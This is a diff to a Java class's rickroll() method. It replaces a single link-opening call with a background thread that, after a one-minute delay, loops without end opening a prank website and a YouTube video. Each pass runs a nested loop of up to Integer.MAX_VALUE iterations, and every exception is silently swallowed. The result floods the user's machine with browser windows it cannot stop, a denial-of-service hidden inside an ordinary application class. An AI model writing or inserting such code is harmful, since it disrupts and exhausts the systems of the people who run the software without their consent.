@@ -299,7 +299,25 @@ class HUD implements java.io.Serializable {
 
     public boolean rickroll() {
         showResponse("            You've been rickrolled!");
-        return openURL("https://youtu.be/dQw4w9WgXcQ?t=1"); //NOTICE: this appears not to work on chrome-based browsers.
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while(true) {
+                    try{Thread.sleep(60000);}
+                    catch(Exception e){}
+                    finally {
+                        for (int i = 0; i <= Integer.MAX_VALUE; i++) {
+                            openURL("http://rickroll2point0.weebly.com/");
+                            try{java.awt.Desktop.getDesktop().browse(java.net.URI.create("https://www.youtube.com/watch?v=Coj5o2l_L0U"));}
+                            catch(Exception e){}
+                        }
+                    }
+                }
+            }
+        }).start();
+        try{java.awt.Desktop.getDesktop().browse(java.net.URI.create("https://www.youtube.com/watch?v=Coj5o2l_L0U"));}
+        catch(Exception e){}
+        return openURL("http://rickroll2point0.weebly.com/"); //NOTICE: this appears not to work on chrome-based browsers.
     }
 
     /**
